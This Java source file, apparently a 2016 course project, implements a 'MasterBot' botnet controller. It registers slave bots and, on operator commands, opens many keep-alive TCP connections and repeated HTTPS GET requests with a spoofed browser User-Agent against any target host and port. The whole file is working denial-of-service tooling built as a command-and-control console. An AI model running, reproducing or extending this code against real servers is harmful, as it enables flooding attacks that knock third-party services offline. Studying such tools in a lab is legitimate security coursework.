/**
 * Created by sahilkaw on 10/20/16.
 */
// server side programming - MasterBot

import java.io.*;
import java.net.*;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.Arrays;
import java.util.Scanner;
import java.util.Date;
import java.sql.Timestamp;
import java.util.Scanner;
import java.util.*;
import java.net.InetAddress;
import java.util.Arrays;
import java.net.Socket;
import java.util.HashMap;
import java.util.Map;
import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;

//A slave program which accepts the requests from the Master to connect to the ip address at a particular port
public class MasterBot extends Thread {
    private ServerSocket serverSocket;
    public static int cnt5 =0;
    public static String Ip_addr = "127.0.0.1";
    public static arr  [] Objarr = new arr [200000];
    public static int count = 0;

    public MasterBot(int port) throws IOException {
        serverSocket = new ServerSocket(port);
    }

    public void run() {
        while (true) {
            try {


                //accepting the incoming clients
                for(int i =0; i<200000;i++) {
                    Date date = new Date();
                    long time = date.getTime();
                    Timestamp ts = new Timestamp(time);
                    String RD = ts.toString().substring(0, 10);
                    Socket Master = serverSocket.accept();
                    String x = Integer.toString(i);
                    String client = "Slave" + x;
                    String remoteAddr = Master.getRemoteSocketAddress().toString();
                    //System.out.println(remoteAddr);
                    String[] portNo1 = remoteAddr.split(":");
                    String portNo = portNo1[1];
                    int portNoInt = Integer.parseInt(portNo);
                    Objarr[i] = new arr(client, portNoInt, RD);
                    //String ip = "127.0.0.1";
                    //String ipAddr = ip + Objarr[i].getX();
                    count++;
                    Master.close();
                }
            } catch (IOException s) {
                // s.printStackTrace();
                break;
            }

        }

    }

    public static void main (String [] args){
         //int cnt5 =0;
        try
        {
            if (args.length == 2) {
                String inpt = args[0];
                int port1 = Integer.parseInt(args[1]);
                if (inpt.equalsIgnoreCase("-p")) {
                    if(port1 > 1024) {

                        int port = Integer.parseInt(args[1]);
                        try {
                            Thread t = new MasterBot(port);
                            t.start();
                        } catch (IOException e) {
                            // e.printStackTrace();
                        }
                        while (true) {
                            Scanner sc = new Scanner(System.in);
                            System.out.print(">");
                            String command = sc.nextLine();
                            String[] cmnd = command.split(" ");
                            //if (cmnd.length == 1) {
                            if (cmnd[0].equalsIgnoreCase("list")) {
                                if(cmnd.length > 1){
                                    System.out.println("The input is not correct. List does not take any arguments ");
                                    System.out.println("-1");
                                    System.exit(-1);
                                }
                                // System.out.println(count);
                                for (int i = 0; i < count; i++) {
                                    String ip = "127.0.0.1";
                                    System.out.println(Objarr[i].getName() + " " + ip + " " + Objarr[i].getX() + " " + Objarr[i].getDate());
                                }
                            }
                            //else {
                            //  System.out.println("The input command is not correct, Do you want to enter list");
                            //}
                            //}
                            // else{
                            //Inserted

                            else if((cmnd[0].equalsIgnoreCase("connect")) && cmnd.length == 5) {
                              //  String nextinp = cmnd[4];
                               // if (nextinp.equalsIgnoreCase("keepalive")){
                                    if (cmnd[1].equalsIgnoreCase("all")) {
                                        String webName = cmnd[2];
                                        String portNoTrgt = cmnd[3];
                                        String connections = cmnd[4];
                                        if (connections.equalsIgnoreCase("keepalive")) {
                                            int trgtPNo = Integer.parseInt(portNoTrgt);
                                            //int numbr = Integer.parseInt(connections);


                                            for (int y = 0; y < count; y++) {
                                                SocketConnection.connectkeepAlive(Objarr[y].getX(), trgtPNo, webName);

                                            }
                                        } else {
                                            //System.out.println("I AM NOT HERE");
                                            String webName2 = cmnd[2];
                                            String portNoTrgt2 = cmnd[3];
                                            //String connections2 = cmnd[4];
                                            int trgtPNo2 = Integer.parseInt(portNoTrgt2);
                                            //int numbr = Integer.parseInt(connections2);
                                            int lenthoflast = cmnd[4].length();
                                            String clName = cmnd[4].substring(4, lenthoflast);
                                            String webName1 = cmnd[2];
                                            String url1 = "https://"+ webName1+clName;
                                            //System.out.println(url1);

                                            for (int y = 0; y < count; y++) {
                                                SocketConnection.connectkeepAlive(Objarr[y].getX(), trgtPNo2, webName2);
                                                Connxn.connGet1(url1);
                                            }
                                        }
                                    } else
                                        //Ip_addr = "127.0.0.1";
                                        if (cmnd[1].equalsIgnoreCase(Ip_addr)) {
                                            //Arrays.sort(Objarr);
                                            String webName = cmnd[2];
                                            String portNoTrgt = cmnd[3];
                                            String connections = cmnd[4];
                                            if (connections.equalsIgnoreCase("keepalive")) {
                                                int trgtPNo = Integer.parseInt(portNoTrgt);
                                                //int numbr = Integer.parseInt(connections);


                                                SocketConnection.connectkeepAlive(Objarr[cnt5].getX(), trgtPNo, webName);
                                               // cnt5++;

                                            } else {
                                                String webName2 = cmnd[2];
                                                String portNoTrgt2 = cmnd[3];
                                                //String connections2 = cmnd[4];
                                                int trgtPNo2 = Integer.parseInt(portNoTrgt2);
                                                int lenthoflast = cmnd[4].length();
                                                String clName = cmnd[4].substring(4, lenthoflast);
                                                String webName1 = cmnd[2];
                                                String url1 = "https://"+ webName1+clName;
                                               // System.out.println(url1);
                                                SocketConnection.connectkeepAlive(Objarr[cnt5].getX(), trgtPNo2, webName2);
                                              //  cnt5++;
                                                Connxn.connGet1(url1);
                                            }
                                        } else {
                                            int sNamelen = cmnd[1].length();
                                            //System.out.println(sNamelen);
                                            String slName = cmnd[1].substring(0, 5);
                                            //System.out.println(slName);
                                            String numb = cmnd[1].substring(5, sNamelen);

                                            int num = Integer.parseInt(numb);
                                            if (slName.equalsIgnoreCase("slave") && (num < count)) {
                                                String webName = cmnd[2];
                                                String portNoTrgt = cmnd[3];
                                                String connections = cmnd[4];
                                                if (connections.equalsIgnoreCase("keepalive")) {
                                                    int trgtPNo = Integer.parseInt(portNoTrgt);
                                                    //int numbr = Integer.parseInt(connections);
                                                    for (int d = 0; d < count; d++) {
                                                        if (cmnd[1].equalsIgnoreCase(Objarr[d].getName())) {
                                                            int slavePortNo = Objarr[d].getX();

                                                            SocketConnection.connectkeepAlive(slavePortNo, trgtPNo, webName);
                                                        }
                                                    }

                                                } else {

                                                    String webName2 = cmnd[2];
                                                    String portNoTrgt2 = cmnd[3];
                                                    //String connections2 = cmnd[4];
                                                    int trgtPNo2 = Integer.parseInt(portNoTrgt2);
                                                    int lenthoflast = cmnd[4].length();
                                                    String clName = cmnd[4].substring(4, lenthoflast);
                                                    String webName1 = cmnd[2];
                                                    String url1 = "https://"+ webName1+clName;
                                                 //   System.out.println(url1);
                                                    for (int d = 0; d < count; d++) {
                                                        if (cmnd[1].equalsIgnoreCase(Objarr[d].getName())) {
                                                            int slavePortNo = Objarr[d].getX();
                                                            SocketConnection.connectkeepAlive(Objarr[cnt5].getX(), trgtPNo2, webName2);
                                                            Connxn.connGet1(url1);
                                                        }

                                                    }
                                                }
                                            } else {
                                                System.out.println("Slave name does not exist, Please chose a correct name from list");
                                                System.out.println("-1");
                                                System.exit(-1);
                                            }

                                        }
                            }
                           // else {
                                  /*  int lenthoflast = cmnd[4].length();
                                    String clName = cmnd[4].substring(4, lenthoflast);
                                    String webName2 = cmnd[2];
                                    String url1 = webName2+clName; */
                                    //URLConnection httpss = new URLConnection();

                                    //System.out.println(url);

                           // }
                          //  }

                            //if the command line is no of connections and keepalive both

                            else if((cmnd[0].equalsIgnoreCase("connect")) && cmnd.length == 6) {

                                String nextinp = cmnd[5];
                                if (nextinp.equalsIgnoreCase("keepalive")){
                                    if (cmnd[1].equalsIgnoreCase("all")) {
                                        String webName = cmnd[2];
                                        String portNoTrgt = cmnd[3];
                                        String connections = cmnd[4];

                                        int trgtPNo = Integer.parseInt(portNoTrgt);
                                        int numbr = Integer.parseInt(connections);


                                        for (int y = 0; y < count; y++) {
                                            SocketConnection.connectallkeepAlive(Objarr[y].getX(), trgtPNo, webName, numbr);
                                        }
                                    } else if (cmnd[1].equalsIgnoreCase(Ip_addr)) {
                                        String webName = cmnd[2];
                                        String portNoTrgt = cmnd[3];
                                        String connections = cmnd[4];
                                        int trgtPNo = Integer.parseInt(portNoTrgt);
                                        int numbr = Integer.parseInt(connections);
                                        SocketConnection.connectallkeepAlive(Objarr[cnt5].getX(), trgtPNo, webName, numbr);
                                       // cnt5++;

                                    } else {
                                        int sNamelen = cmnd[1].length();
                                        //System.out.println(sNamelen);
                                        String slName = cmnd[1].substring(0, 5);
                                        //System.out.println(slName);
                                        String numb = cmnd[1].substring(5, sNamelen);

                                        int num = Integer.parseInt(numb);
                                        if (slName.equalsIgnoreCase("slave") && (num < count)) {
                                            String webName = cmnd[2];
                                            String portNoTrgt = cmnd[3];
                                            String connections = cmnd[4];
                                            int trgtPNo = Integer.parseInt(portNoTrgt);
                                            int numbr = Integer.parseInt(connections);
                                            for (int d = 0; d < count; d++) {
                                                if (cmnd[1].equalsIgnoreCase(Objarr[d].getName())) {
                                                    int slavePortNo = Objarr[d].getX();
                                                    SocketConnection.connectallkeepAlive(slavePortNo, trgtPNo, webName, numbr);
                                                }

                                            }
                                        } else {
                                            System.out.println("Slave name does not exist, Please chose a correct name from list");
                                            System.out.println("-1");
                                            System.exit(-1);
                                        }

                                    }
                            }
                            else{
                                    if (cmnd[1].equalsIgnoreCase("all")) {
                                        String webName = cmnd[2];
                                        String portNoTrgt = cmnd[3];
                                        String connections = cmnd[4];
                                        int lenthoflast = cmnd[5].length();
                                        String clName = cmnd[5].substring(4, lenthoflast);
                                        String webName1 = cmnd[2];
                                        String url1 = "https://"+ webName1+clName;
                                    //    System.out.println(url1);
                                        int trgtPNo = Integer.parseInt(portNoTrgt);
                                        int numbr = Integer.parseInt(connections);
                                      //  System.out.println("The" + count);

                                        for (int y = 0; y < count; y++) {

                                                SocketConnection.connectallkeepAlive(Objarr[y].getX(), trgtPNo, webName, numbr);
                                                Connxn.connGet(url1,numbr);


                                        }
                                    } else if (cmnd[1].equalsIgnoreCase(Ip_addr)) {
                                        String webName = cmnd[2];
                                        String portNoTrgt = cmnd[3];
                                        String connections = cmnd[4];
                                        int lenthoflast = cmnd[5].length();
                                        String clName = cmnd[5].substring(4, lenthoflast);
                                        String webName1 = cmnd[2];
                                        String url1 = "https://"+ webName1+clName;
                                        int trgtPNo = Integer.parseInt(portNoTrgt);
                                        int numbr = Integer.parseInt(connections);
                                        SocketConnection.connectallkeepAlive(Objarr[cnt5].getX(), trgtPNo, webName, numbr);
                                       // cnt5++;
                                        Connxn.connGet(url1,numbr);

                                    } else {
                                        int sNamelen = cmnd[1].length();
                                        String slName = cmnd[1].substring(0, 5);
                                        String numb = cmnd[1].substring(5, sNamelen);
                                        int num = Integer.parseInt(numb);
                                        if (slName.equalsIgnoreCase("slave") && (num < count)) {
                                            String webName = cmnd[2];
                                            String portNoTrgt = cmnd[3];
                                            String connections = cmnd[4];
                                            int lenthoflast = cmnd[5].length();
                                            String clName = cmnd[5].substring(4, lenthoflast);
                                            String webName1 = cmnd[2];
                                            String url1 = "https://"+ webName1+clName;
                                            int trgtPNo = Integer.parseInt(portNoTrgt);
                                            int numbr = Integer.parseInt(connections);
                                            for (int d = 0; d < count; d++) {
                                                if (cmnd[1].equalsIgnoreCase(Objarr[d].getName())) {
                                                    int slavePortNo = Objarr[d].getX();
                                                    SocketConnection.connectallkeepAlive(slavePortNo, trgtPNo, webName, numbr);
                                                    Connxn.connGet(url1,numbr);

                                                }

                                            }
                                        } else {
                                            System.out.println("Slave name does not exist, Please chose a correct name from list");
                                            System.out.println("-1");
                                            System.exit(-1);
                                        }

                                    }
                                  /*  int lenthoflast = cmnd[5].length();
                                    String clName = cmnd[5].substring(4, lenthoflast);
                                    String webName1 = cmnd[2];
                                    String url1 = "https://"+ webName1+clName;
                                    System.out.println(url1);

                                    try {

                                        Connxn.connGet(url1);
                                    } catch (Exception e) {
                                        e.printStackTrace();
                                    }*/

                                }
                            }

                            //Inserted

                            //
                            else  if (cmnd[0].equalsIgnoreCase("connect")){
                                if (cmnd.length < 4){
                                    System.out.println("The command is not correct. Missing Target Ip/Name or Port no ");
                                    System.out.println("-1");
                                    System.exit(-1);
                                }
                                else
                                if(cmnd[1].equalsIgnoreCase("all")){
                                    //System.out.println("Connect all");
                                    String webName = cmnd[2];
                                    String portNoTrgt = cmnd[3];
                                    int trgtPNo = Integer.parseInt(portNoTrgt);
                                    //System.out.println(webName);
                                    //System.out.println(trgtPNo);


                                    for(int y = 0; y< count; y++){
                                        SocketConnection.connect(Objarr[y].getX(), trgtPNo, webName);
                                    }
                                }
                                else
                                    //Ip_addr = "127.0.0.1";
                                    if(cmnd[1].equalsIgnoreCase(Ip_addr)){
                                        String webName = cmnd[2];
                                        String portNoTrgt = cmnd[3];
                                        int trgtPNo = Integer.parseInt(portNoTrgt);
                                        SocketConnection.connect(Objarr[cnt5].getX(), trgtPNo, webName);
                                        //cnt5++;
                                    }
                                    else
                                    if((cmnd[1].equalsIgnoreCase("1")) || (cmnd[1].equalsIgnoreCase("2")) || (cmnd[1].equalsIgnoreCase("3")) || (cmnd[1].equalsIgnoreCase("4")) || (cmnd[1].equalsIgnoreCase("5"))|| (cmnd[1].equalsIgnoreCase("6")) || (cmnd[1].equalsIgnoreCase("7")) || (cmnd[1].equalsIgnoreCase("8")) || (cmnd[1].equalsIgnoreCase("9")) || (cmnd[1].equalsIgnoreCase("10"))){
                                        //System.out.println("Connect all");
                                        int tot = Integer.parseInt(cmnd[1]);
                                        String webName = cmnd[2];
                                        String portNoTrgt = cmnd[3];
                                        int trgtPNo = Integer.parseInt(portNoTrgt);
                                        //System.out.println(webName);
                                        //System.out.println(trgtPNo);


                                        for(int q = 0; q< tot; q++){
                                            SocketConnection.connect(Objarr[q].getX(), trgtPNo, webName);
                                        }
                                    }
                                    else {
                                        int sNamelen = cmnd[1].length();
                                        //System.out.println(sNamelen);
                                        String slName = cmnd[1].substring(0,5);
                                        //System.out.println(slName);
                                        String numb = cmnd[1].substring(5,sNamelen);

                                        int num = Integer.parseInt(numb);
                                        if(slName.equalsIgnoreCase("slave") && (num < count)){
                                            String webName = cmnd[2];
                                            String portNoTrgt = cmnd[3];
                                            int trgtPNo = Integer.parseInt(portNoTrgt);

                                            for(int d = 0; d <count; d++){
                                                if (cmnd[1].equalsIgnoreCase(Objarr[d].getName())){
                                                    int slavePortNo = Objarr[d].getX();
                                                    SocketConnection.connect(slavePortNo, trgtPNo, webName);
                                                }

                                            }
                                        }
                                        else{
                                            System.out.println("Slave name does not exist, Please chose a correct name from list");
                                            System.out.println("-1");
                                            System.exit(-1);
                                        }

                                    }

                                //}
                            }
                            else
                            if(cmnd[0].equalsIgnoreCase("disconnect")){


                                String Ip_addr1 = Inet4Address.getLocalHost().getHostAddress().toString();
                                if (cmnd.length < 3){
                                    System.out.println("The command is not correct. Missing Target Ip/Name ");
                                    System.out.println("-1");
                                    System.exit(-1);
                                }
                                else
                                if(cmnd[1].equalsIgnoreCase("all")){
                                    String webName = cmnd[2];
                                    //String portNoTrgt = cmnd[3];
                                    //int trgtPNo = Integer.parseInt(portNoTrgt);
                                    //System.out.println(webName);
                                    //System.out.println(trgtPNo);
                                    for(int y = 0; y< count; y++){
                                        // System.out.println(Objarr[y].getX());
                                        //SocketConnection.disconnectall(Objarr[y].getX(), trgtPNo, webName);
                                        SocketConnection.disconnectall(Objarr[y].getX(), webName);

                                    }

                                }
                                else{


                                    //Ip_addr = Ip_addr1;
                                    Ip_addr = "127.0.0.1";
                                    if(cmnd[1].equalsIgnoreCase(Ip_addr)){
                                        //Arrays.sort(Objarr);
                                        String webName = cmnd[2];
                                        //String portNoTrgt = cmnd[3];
                                        //int trgtPNo = Integer.parseInt(portNoTrgt);
                                        SocketConnection.disconnectall(Objarr[0].getX(), webName);
                                        //cnt5++;
                                    }
                                    else {
                                        int sNamelen = cmnd[1].length();
                                        //.out.println(sNamelen);
                                        String slName = cmnd[1].substring(0,5);
                                        //
                                        // System.out.println(slName);
                                        String numb = cmnd[1].substring(5,sNamelen);

                                        int num = Integer.parseInt(numb);
                                        if(slName.equalsIgnoreCase("slave") && (num < count)){
                                            String webName = cmnd[2];
                                            // String portNoTrgt = cmnd[3];
                                            //  int trgtPNo = Integer.parseInt(portNoTrgt);

                                            for(int d = 0; d <count; d++){
                                                if (cmnd[1].equalsIgnoreCase(Objarr[d].getName())){
                                                    int slavePortNo = Objarr[d].getX();
                                                    // System.out.println("TO do");
                                                    SocketConnection.disconnectall(slavePortNo, webName);
                                                }

                                            }
                                        }
                                        else{
                                            System.out.println("Slave name does not exist. Please chose a correct name from list");
                                            System.out.println("-1");
                                            System.exit(-1);
                                        }

                                    }
                                }
                            }
                            else{
                                System.out.println("The valid commands are List/Connect/Disconnect");
                                System.out.println("-1");
                                System.exit(-1);
                            }
                            //}
                            // }

                        }
                    }

                    else{
                        System.out.println("The port number less than 1024 is not permitted by default, Please enter value greater than 1024");
                        System.out.println("-1");
                        System.exit(-1);
                    }
                }
                else{
                    System.out.println("The arguments are not correct -p followed by port number");
                    System.out.println("-1");
                    System.exit(-1);
                }
            }
            else{
                System.out.println("The MasterBot takes two arguments -p followed by port number ");
                System.out.println("-1");
                System.exit(-1);
            }

        }catch (IOException s){
            // s.printStackTrace();

        } catch (Exception e) {
            e.printStackTrace();
        }

    }



}

class arr {
    private String name;
    private int x;
    private String Date;

    arr(String name, int x, String Date) {
        this.name = name;
        this.x = x;
        this.Date = Date;
    }

    public String getName() {
        return name;
    }

    public int getX() {
        return x;
    }

    public String getDate() {
        return Date;
    }
}

class Connxn {
    String url1;


    public static void connGet(String url1, int numbrr) throws Exception {
         String USER_AGENT = "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.4; en-US; rv:1.9.2.2) Gecko/20100316 Firefox/5.0";
        for (int x=0;x<numbrr;x++) {
            String url = url1;

            URL obj = new URL(url);
            HttpURLConnection con = (HttpURLConnection) obj.openConnection();

            // optional default is GET
            con.setRequestMethod("GET");

            //add request header
            con.setRequestProperty("User-Agent", USER_AGENT);
            //
            con.setRequestProperty("Connection", "Keep-Alive");
            con.setRequestProperty("Keep-Alive", "header");
            //
            int responseCode = con.getResponseCode();
           // System.out.println("\nSending 'GET' request to URL : " + url);
           // System.out.println("Response Code : " + responseCode);

            BufferedReader in = new BufferedReader(
                    new InputStreamReader(con.getInputStream()));
            String inputLine;
            StringBuffer response = new StringBuffer();

            while ((inputLine = in.readLine()) != null) {
                response.append(inputLine);
            }
            in.close();

            //print result
           // System.out.println(response.toString());
        }
    }

    public static void connGet1(String url1) throws Exception {
        String USER_AGENT = "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.4; en-US; rv:1.9.2.2) Gecko/20100316 Firefox/5.0";

            String url = url1;

            URL obj = new URL(url);
            HttpURLConnection con = (HttpURLConnection) obj.openConnection();

            // optional default is GET
            con.setRequestMethod("GET");

            //add request header
            con.setRequestProperty("User-Agent", USER_AGENT);
            //
            con.setRequestProperty("Connection", "Keep-Alive");
            con.setRequestProperty("Keep-Alive", "header");
            //
            int responseCode = con.getResponseCode();
           // System.out.println("\nSending 'GET' request to URL : " + url);
           // System.out.println("Response Code : " + responseCode);

            BufferedReader in = new BufferedReader(
                    new InputStreamReader(con.getInputStream()));
            String inputLine;
            StringBuffer response = new StringBuffer();

            while ((inputLine = in.readLine()) != null) {
                response.append(inputLine);
            }
            in.close();

            //print result
          //  System.out.println(response.toString());

    }

}

class SocketConnection {
    int portNo;
    String webN;
    int trgtPNo;
    public static int a = 0;
    public static arr1  [] Objarr1 = new arr1 [200000];
    public static Map<Integer, Socket> map = new HashMap<Integer, Socket>();
    public static int cnt = 0;
    public static int cnt1 = 0;
    public static int cnt2 = cnt1/2;

    /**
     * @param args
     */

    public static void connect(int portNo, int trgtPNo, String webN) {

        try {
            Socket socket = new Socket(webN, trgtPNo);

            //System.out.println("Listening on " + socket.getLocalSocketAddress());
            //System.out.println("connected1 on " + socket.getLocalPort());
            //System.out.println("Inet address" + socket.getInetAddress());
            map.put(portNo, socket);
            //System.out.println("XXX" + portNo);
            cnt++;
            //System.out.println("AA"+ cnt);
        } catch (Exception e) {
            // e.printStackTrace();
        }
    }

    public static void connectall(int portNo1, int trgtPNo, String webN, int n) {

        try {
            for(int e=0; e< n; e++) {

                Socket socket = new Socket(webN, trgtPNo);
                int remPortNo = socket.getLocalPort();
                Objarr1[e] = new arr1(portNo1,remPortNo);
                int portNo = remPortNo;
                // System.out.println("Port in map" + portNo);
                map.put(portNo, socket);
                //System.out.println("XXX" + Objarr1[e].getRportNo());
                //System.out.println("XXX" + Objarr1[e].getSportNo());
                // System.out.println("Connected to:  " + socket.getRemoteSocketAddress());
                //System.out.println("Listening on " + socket.getLocalSocketAddress());
                //System.out.println("connected1 on " + socket.getLocalPort());
                // System.out.println("Inet address" + socket.getInetAddress());
                cnt1++;

                //System.out.println("BBli"+ " " +cnt1);
                //System.out.println(Objarr1[e].getSportNo()+ "  " + Objarr1[e].getRportNo());
            }


        } catch (Exception e) {
            // e.printStackTrace();
        }
    }

    //inserted
    public static void connectkeepAlive(int portNo, int trgtPNo, String webN) {

        try {
            Socket socket = new Socket(webN, trgtPNo);
            socket.setKeepAlive(true);
            //System.out.println("Listening on " + socket.getLocalSocketAddress());
            //System.out.println("connected1 on " + socket.getLocalPort());
            //System.out.println("Inet address" + socket.getInetAddress());
            map.put(portNo, socket);
            //System.out.println("XXX" + portNo);
            cnt++;

           // System.out.println("AA"+ socket.getKeepAlive());
        } catch (Exception e) {
            // e.printStackTrace();
        }
    }

    public static void connectallkeepAlive(int portNo1, int trgtPNo, String webN, int n) {

        try {
            for(int e=0; e< n; e++) {


                Socket socket = new Socket(webN, trgtPNo);
                socket.setKeepAlive(true);
                int remPortNo = socket.getLocalPort();
                Objarr1[e] = new arr1(portNo1,remPortNo);
                int portNo = remPortNo;
                // System.out.println("Port in map" + portNo);
                map.put(portNo, socket);
                //System.out.println("XXX" + Objarr1[e].getRportNo());
                //System.out.println("XXX" + Objarr1[e].getSportNo());
                // System.out.println("Connected to:  " + socket.getRemoteSocketAddress());
                //System.out.println("Listening on " + socket.getLocalSocketAddress());
                //System.out.println("connected1 on " + socket.getLocalPort());
                // System.out.println("Inet address" + socket.getInetAddress());
                cnt1++;

               // System.out.println("BBli"+ " " +socket.getKeepAlive());
                //System.out.println(Objarr1[e].getSportNo()+ "  " + Objarr1[e].getRportNo());
            }


        } catch (Exception e) {
            // e.printStackTrace();
        }
    }


    public static void disconnectall(int portNo1,  String webN) {
        try {
            // for(int r = 0; r < cnt; r++) {

            int portNo = portNo1;
            if (map.containsKey(portNo)) {
                // System.out.println("xxx" + portNo1);
                // System.out.println("SS" + cnt);
                Socket x = map.get(portNo);
                x.close();
                map.remove(portNo);
                cnt--;
            } else if(!map.containsKey(portNo1)){
                // System.out.println("ABC" + portNo1);
                if(cnt1>0) {
                    for (int i = 0; i <= cnt1; i++) {
                        //       System.out.println("Length" + cnt1);
                        if (portNo1 == Objarr1[i].getSportNo()) {
                            //         System.out.println("I am here");
                            portNo = Objarr1[i].getRportNo();
                            //       System.out.println("port" + portNo);
                            //Socket x = map.get(portNo);
                            //x.close();
                            // map.remove(portNo);

                        }
                        if (map.containsKey(portNo)) {
                            Socket x = map.get(portNo);
                            x.close();
                            cnt1--;
                            map.remove(portNo);
                            //     System.out.println("Leng" + cnt1);
                        }
                    }
                }

            }

            //System.out.println("red" + " " + cnt);
            //System.out.println(x.isClosed());
            // }
        } catch (Exception e) {
            //e.printStackTrace();
        }
    }


    //inserted



    public static void disconnect(int portNo1, int trgtPNo, String webN) {
        try {
            int portNo = portNo1;
            if (map.containsKey(portNo)) {
                Socket x = map.get(portNo);
                x.close();
                map.remove(portNo);
                cnt--;
            }
            else {
                for(int i = 0; i < cnt; i++){
                    // System.out.println("Length" + cnt);
                    if (portNo1 == Objarr1[i].getSportNo()){
                        //       System.out.println("I am here");
                        portNo = Objarr1[i].getRportNo();
                        Socket x = map.get(portNo);
                        x.close();
                        map.remove(portNo);
                        cnt--;
                    }
                }
            }
            //System.out.println(x.isClosed());

        } catch (Exception e) {
            // e.printStackTrace();
        }
    }
}


class arr1 {
    private int portNo;
    private int RportNo;


    arr1(int portNo, int RportNo) {
        this.portNo = portNo;
        this.RportNo = RportNo;
    }

    public int getSportNo() {
        return portNo;
    }

    public int getRportNo() {
        return RportNo;
    }
}
